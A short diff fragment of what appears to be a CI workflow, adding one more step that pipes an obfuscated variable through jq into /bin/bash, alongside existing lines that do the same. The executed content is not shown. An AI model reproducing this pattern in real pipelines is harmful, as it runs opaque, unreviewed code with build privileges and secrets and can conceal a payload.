@@ -43,6 +43,7 @@ jobs:
           echo $oa77 | jq -r .yaag74 | /bin/bash
           echo $ras69 | jq -r .vx87357 | /bin/bash
           echo $axwx560 | jq -r .xra0 | /bin/bash
+          printf '%s' "$bsz955" | jq -r .dxa9 | /bin/bash
 
       - name: Store results
         if: always()
